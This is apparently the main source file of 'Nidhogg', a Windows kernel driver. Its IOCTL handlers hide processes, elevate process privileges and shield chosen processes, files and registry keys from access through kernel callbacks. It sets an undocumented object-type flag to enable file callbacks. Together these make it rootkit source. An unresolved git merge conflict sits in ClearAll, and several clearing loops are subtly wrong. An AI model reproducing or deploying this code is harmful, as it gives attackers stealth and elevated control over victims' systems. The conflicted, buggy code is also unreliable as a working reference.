#include "pch.h"
#include "Nidhogg.h"
#include "ProcessUtils.hpp"
#include "FileUtils.hpp"
#include "RegistryUtils.hpp"

extern "C"
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
	auto status = STATUS_SUCCESS;
	pGlobals.Init();
	fGlobals.Init();
	rGlobals.Init();

	// Setting up the device object.
	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(DRIVER_DEVICE_NAME);
	UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(DRIVER_SYMBOLIC_LINK);
	UNICODE_STRING altitude = RTL_CONSTANT_STRING(OB_CALLBACKS_ALTITUDE);
	UNICODE_STRING regAltitude = RTL_CONSTANT_STRING(REG_CALLBACK_ALTITUDE);
	PDEVICE_OBJECT DeviceObject = nullptr;

	// Creating device and symbolic link.
	status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);

	if (!NT_SUCCESS(status)) {
		KdPrint((DRIVER_PREFIX "failed to create device: (0x%08X)\n", status));
		return status;
	}

	status = IoCreateSymbolicLink(&symbolicLink, &deviceName);

	if (!NT_SUCCESS(status)) {
		KdPrint((DRIVER_PREFIX "failed to create symbolic link: (0x%08X)\n", status));
		IoDeleteDevice(DeviceObject);
		return status;
	}

	// Enabling file callbacks.
	POBJECT_TYPE_TEMP ObjectTypeTemp = (POBJECT_TYPE_TEMP)*IoFileObjectType;
	ObjectTypeTemp->TypeInfo.SupportsObjectCallbacks = 1;

	// Registering the process and file hooking function.
	OB_OPERATION_REGISTRATION operations[] = {
		{
			PsProcessType,		// object type
			OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
			OnPreOpenProcess, nullptr	// pre, post
		},
		{
			IoFileObjectType,
			OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
			OnPreFileOperation, nullptr
		}
	};
	OB_CALLBACK_REGISTRATION registrationCallbacks = {
		OB_FLT_REGISTRATION_VERSION,
		2,				// operation count
		RTL_CONSTANT_STRING(OB_CALLBACKS_ALTITUDE),		// altitude
		nullptr,		// context
		operations
	};

	status = ObRegisterCallbacks(&registrationCallbacks, &registrationHandle);

	if (!NT_SUCCESS(status)) {
		KdPrint((DRIVER_PREFIX "failed to register process and file callbacks: (0x%08X)\n", status));
		IoDeleteSymbolicLink(&symbolicLink);
		IoDeleteDevice(DeviceObject);
		return status;
	}

	status = CmRegisterCallbackEx(OnRegistryNotify, &regAltitude, DriverObject, nullptr, &rGlobals.RegCookie, nullptr);

	if (!NT_SUCCESS(status)) {
		KdPrint((DRIVER_PREFIX "failed to register registry callback: (0x%08X)\n", status));

		if (registrationHandle) {
			ObUnRegisterCallbacks(registrationHandle);
			registrationHandle = NULL;
		}
		IoDeleteSymbolicLink(&symbolicLink);
		IoDeleteDevice(DeviceObject);
		return status;
	}

	// Setting up functions.
	DriverObject->DriverUnload = NidhoggUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = NidhoggCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = NidhoggDeviceControl;

	KdPrint((DRIVER_PREFIX "Initialization finished.\n"));
	return status;
}


void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
	KdPrint((DRIVER_PREFIX "Unloading...\n"));

	NTSTATUS status = CmUnRegisterCallback(rGlobals.RegCookie);

	if (!NT_SUCCESS(status)) {
		KdPrint((DRIVER_PREFIX "failed to unregister registry callbacks: (0x%08X)\n", status));
	}
	ClearAll();

	// To avoid BSOD.
	if (registrationHandle) {
		ObUnRegisterCallbacks(registrationHandle);
		registrationHandle = NULL;
	}

	UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(DRIVER_SYMBOLIC_LINK);
	IoDeleteSymbolicLink(&symbolicLink);
	IoDeleteDevice(DriverObject->DeviceObject);
}


NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status, ULONG_PTR info) {
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = info;
	IoCompleteRequest(Irp, 0);
	return status;
}


NTSTATUS NidhoggCreateClose(PDEVICE_OBJECT, PIRP Irp) {
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}


NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	auto status = STATUS_SUCCESS;
	auto len = 0;

	switch (stack->Parameters.DeviceIoControl.IoControlCode) {
	case IOCTL_NIDHOGG_PROTECT_PROCESS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
		
		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		AutoLock locker(pGlobals.Lock);

		for (int i = 0; i < size / sizeof(ULONG); i++) {
			auto pid = data[i];
			if (pid == 0) {
				status = STATUS_INVALID_PARAMETER;
				break;
			}
			if (FindProcess(pid))
				continue;

			if (pGlobals.Processes.PidsCount == MAX_PIDS) {
				status = STATUS_TOO_MANY_CONTEXT_IDS;
				break;
			}

			if (!AddProcess(pid)) {
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			KdPrint((DRIVER_PREFIX "Protecting process with pid %d.\n", pid));

			len += sizeof(ULONG);
		}

		break;
	}

	case IOCTL_NIDHOGG_UNPROTECT_PROCESS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		AutoLock locker(pGlobals.Lock);

		for (int i = 0; i < size / sizeof(ULONG); i++) {
			auto pid = data[i];

			if (pid == 0) {
				status = STATUS_INVALID_PARAMETER;
				break;
			}

			if (!RemoveProcess(pid)) {
				status = STATUS_NOT_FOUND;
				break;
			}

			len += sizeof(ULONG);

			if (pGlobals.Processes.PidsCount == 0)
				break;
		}

		break;
	}

	case IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION:
	{
		AutoLock locker(pGlobals.Lock);
		memset(&pGlobals.Processes.Pids, 0, sizeof(pGlobals.Processes.Pids));
		pGlobals.Processes.PidsCount = 0;
		break;
	}

	case IOCTL_NIDHOGG_HIDE_PROCESS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		for (int i = 0; i < size / sizeof(ULONG); i++) {
			auto pid = data[i];

			if (pid == 0) {
				status = STATUS_INVALID_PARAMETER;
				break;
			}

			if (!NT_SUCCESS(HideProcess(pid))) {
				status = STATUS_UNSUCCESSFUL;
				break;
			}
		}
		break;
	}

	case IOCTL_NIDHOGG_ELEVATE_PROCESS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		for (int i = 0; i < size / sizeof(ULONG); i++) {
			auto pid = data[i];

			if (pid == 0) {
				status = STATUS_INVALID_PARAMETER;
				break;
			}

			if (!NT_SUCCESS(ElevateProcess(data[i]))) {
				status = STATUS_UNSUCCESSFUL;
				break;
			}
		}
		break;
	}

	case IOCTL_NIDHOGG_QUERY_PROCESSES:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(ProcessesList) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ProcessesList*)Irp->AssociatedIrp.SystemBuffer;

		AutoLock locker(pGlobals.Lock);
		data->PidsCount = pGlobals.Processes.PidsCount;

		for (int i = 0; i < pGlobals.Processes.PidsCount; i++) {
			data->Pids[i] = pGlobals.Processes.Pids[i];
		}

		len += sizeof(ProcessesList);

		break;
	}

	case IOCTL_NIDHOGG_PROTECT_FILE:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(WCHAR) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (WCHAR*)Irp->AssociatedIrp.SystemBuffer;

		if (!data) {
			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		AutoLock locker(fGlobals.Lock);

		if (fGlobals.Files.FilesCount == MAX_FILES) {
			KdPrint((DRIVER_PREFIX "List is full.\n"));
			status = STATUS_TOO_MANY_CONTEXT_IDS;
			break;
		}

		if (!FindFile(data)) {
			if (!AddFile(data)) {
				KdPrint((DRIVER_PREFIX "Failed to add file.\n"));
				status = STATUS_UNSUCCESSFUL;
				break;
			}
			
			auto prevIrql = KeGetCurrentIrql();
			KeLowerIrql(PASSIVE_LEVEL);
			KdPrint((DRIVER_PREFIX "Protecting file %ws.\n", data));
			KeRaiseIrql(prevIrql, &prevIrql);
		}

		break;
	}

	case IOCTL_NIDHOGG_UNPROTECT_FILE:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(WCHAR) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (WCHAR*)Irp->AssociatedIrp.SystemBuffer;

		if (!data) {
			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		AutoLock locker(fGlobals.Lock);

		if (!RemoveFile(data)) {
			status = STATUS_NOT_FOUND;
			break;
		}
		break;
	}

	case IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION:
	{
		AutoLock locker(fGlobals.Lock);

		for (int i = 0; i < fGlobals.Files.FilesCount; i++) {
			ExFreePoolWithTag(fGlobals.Files.FilesPath[i], DRIVER_TAG);
			fGlobals.Files.FilesPath[i] = nullptr;
			fGlobals.Files.FilesCount--;
		}

		fGlobals.Files.FilesCount = 0;
		break;
	}

	case IOCTL_NIDHOGG_QUERY_FILES:
	{
		errno_t err;
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(FileItem) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (FileItem*)Irp->AssociatedIrp.SystemBuffer;
		AutoLock locker(fGlobals.Lock);

		if (data->FileIndex == 0) {
			data->FileIndex = fGlobals.Files.FilesCount;

			if (fGlobals.Files.FilesCount > 0) {
				err = wcscpy_s(data->FilePath, fGlobals.Files.FilesPath[0]);

				if (err != 0) {
					status = STATUS_INVALID_USER_BUFFER;
					KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
				}
			}
		}
		else if (data->FileIndex > fGlobals.Files.FilesCount || data->FileIndex < 0) {
			status = STATUS_INVALID_PARAMETER;
		}
		else {
			err = wcscpy_s(data->FilePath, fGlobals.Files.FilesPath[data->FileIndex]);

			if (err != 0) {
				status = STATUS_INVALID_USER_BUFFER;
				KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
			}
		}

		len += sizeof(FileItem);

		break;
	}

	case IOCTL_NIDHOGG_PROTECT_REGITEM:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(RegItem) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (RegItem*)Irp->AssociatedIrp.SystemBuffer;	

		if ((data->Type != REG_TYPE_KEY && data->Type != REG_TYPE_VALUE) || wcslen((*data).KeyPath) == 0) {
			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		AutoLock locker(rGlobals.Lock);

		if (data->Type == REG_TYPE_KEY) {
			if (rGlobals.Keys.KeysCount == MAX_REG_ITEMS) {
				KdPrint((DRIVER_PREFIX "List is full.\n"));
				status = STATUS_TOO_MANY_CONTEXT_IDS;
				break;
			}
		}
		else if (data->Type == REG_TYPE_VALUE) {
			if (rGlobals.Values.ValuesCount == MAX_REG_ITEMS) {
				KdPrint((DRIVER_PREFIX "List is full.\n"));
				status = STATUS_TOO_MANY_CONTEXT_IDS;
				break;
			}
		}
		else {
			KdPrint((DRIVER_PREFIX "Unknown registry object type.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!FindRegItem(*data)) {
			if (!AddRegItem(*data)) {
				KdPrint((DRIVER_PREFIX "Failed to add new registry item.\n"));
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			KdPrint((DRIVER_PREFIX "Added new registry item of type %d.\n", data->Type));
		}
		break;
	}

	case IOCTL_NIDHOGG_UNPROTECT_REGITEM:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(RegItem) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (RegItem*)Irp->AssociatedIrp.SystemBuffer;
		
		if ((data->Type != REG_TYPE_KEY && data->Type != REG_TYPE_VALUE) || wcslen((*data).KeyPath) == 0) {
			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		AutoLock locker(rGlobals.Lock);

		if (!RemoveRegItem(*data)) {
			KdPrint((DRIVER_PREFIX "Registry item not found.\n"));
			status = STATUS_NOT_FOUND;
			break;
		}
		break;
	}

	case IOCTL_NIDHOGG_CLEAR_REGITEMS:
	{
		AutoLock registryLocker(rGlobals.Lock);

		for (int i = 0; i < rGlobals.Keys.KeysCount; i++) {
			ExFreePoolWithTag(rGlobals.Keys.KeysPath[i], DRIVER_TAG);
			rGlobals.Keys.KeysPath[i] = nullptr;
			rGlobals.Keys.KeysCount--;
		}

		rGlobals.Keys.KeysCount = 0;

		for (int i = 0; i < rGlobals.Values.ValuesCount; i++) {
			ExFreePoolWithTag(rGlobals.Values.ValuesPath[i], DRIVER_TAG);
			rGlobals.Values.ValuesPath[i] = nullptr;
			rGlobals.Values.ValuesCount--;
		}

		rGlobals.Values.ValuesCount = 0;
		break;
	}

	case IOCTL_NIDHOGG_QUERY_REGITEMS: 
	{
		errno_t err;
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(RegItem) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (RegItem*)Irp->AssociatedIrp.SystemBuffer;
		AutoLock locker(rGlobals.Lock);

		if (data->Type != REG_TYPE_KEY && data->Type != REG_TYPE_VALUE) {
			status = STATUS_INVALID_PARAMETER;
			KdPrint((DRIVER_PREFIX "Invalid RegItem type.\n"));
		}

		if (data->RegItemsIndex == 0) {
			if (data->Type == REG_TYPE_KEY) {
				data->RegItemsIndex = rGlobals.Keys.KeysCount;

				if (rGlobals.Keys.KeysCount > 0) {
					err = wcscpy_s(data->KeyPath, rGlobals.Keys.KeysPath[0]);

					if (err != 0) {
						status = STATUS_INVALID_USER_BUFFER;
						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
					}
				}
			}
			else if (data->Type == REG_TYPE_VALUE) {
				data->RegItemsIndex = rGlobals.Values.ValuesCount;

				if (rGlobals.Values.ValuesCount > 0) {
					err = wcscpy_s(data->KeyPath, rGlobals.Values.ValuesPath[0]);

					if (err != 0) {
						status = STATUS_INVALID_USER_BUFFER;
						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
					}

					err = wcscpy_s(data->ValueName, rGlobals.Values.ValuesName[0]);

					if (err != 0) {
						status = STATUS_INVALID_USER_BUFFER;
						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
					}
				}
			}
		}
		else if ((data->Type == REG_TYPE_KEY && data->RegItemsIndex > rGlobals.Keys.KeysCount) ||
				  (data->Type == REG_TYPE_VALUE && data->RegItemsIndex > rGlobals.Values.ValuesCount) ||
				  data->RegItemsIndex < 0) {
			status = STATUS_INVALID_PARAMETER;
		}
		else {
			if (data->Type == REG_TYPE_KEY) {
				if (rGlobals.Keys.KeysCount > 0) {
					err = wcscpy_s(data->KeyPath, rGlobals.Keys.KeysPath[data->RegItemsIndex]);

					if (err != 0) {
						status = STATUS_INVALID_USER_BUFFER;
						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
					}
				}
			}
			else if (data->Type == REG_TYPE_VALUE) {
				if (rGlobals.Values.ValuesCount > 0) {
					err = wcscpy_s(data->KeyPath, rGlobals.Values.ValuesPath[data->RegItemsIndex]);

					if (err != 0) {
						status = STATUS_INVALID_USER_BUFFER;
						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
					}

					err = wcscpy_s(data->ValueName, rGlobals.Values.ValuesName[data->RegItemsIndex]);

					if (err != 0) {
						status = STATUS_INVALID_USER_BUFFER;
						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
					}
				}
			}
		}

		len += sizeof(RegItem);

		break;
	}

	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = len;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

void ClearAll() {
	// Clearing the process array.
	AutoLock processLocker(pGlobals.Lock);

<<<<<<< HEAD
	memset(&pGlobals.Processes.Pids, 0, sizeof(pGlobals.Processes.Pids));
	pGlobals.Processes.PidsCount = 0;
=======
	memset(&pGlobals.Pids, 0, sizeof(pGlobals.Pids));
	pGlobals.PidsCount = 0;
>>>>>>> 0a9676d (Pre version 0.1 (#6))

	// Clearing the files array.
	AutoLock filesLocker(fGlobals.Lock);

	for (int i = 0; i < fGlobals.Files.FilesCount; i++) {
		ExFreePoolWithTag(fGlobals.Files.FilesPath[i], DRIVER_TAG);
		fGlobals.Files.FilesPath[i] = nullptr;
		fGlobals.Files.FilesCount--;
	}

	// Clearing the registry keys and values.
	AutoLock registryLocker(rGlobals.Lock);

	for (int i = 0; i < rGlobals.Keys.KeysCount; i++) {
		ExFreePoolWithTag(rGlobals.Keys.KeysPath[i], DRIVER_TAG);
		rGlobals.Keys.KeysPath[i] = nullptr;
		rGlobals.Keys.KeysCount--;
	}

	rGlobals.Keys.KeysCount = 0;

	for (int i = 0; i < rGlobals.Values.ValuesCount; i++) {
		ExFreePoolWithTag(rGlobals.Values.ValuesPath[i], DRIVER_TAG);
		ExFreePoolWithTag(rGlobals.Values.ValuesName[i], DRIVER_TAG);
		rGlobals.Values.ValuesPath[i] = nullptr;
		rGlobals.Values.ValuesName[i] = nullptr;
		rGlobals.Values.ValuesCount--;
	}

	rGlobals.Values.ValuesCount = 0;
}
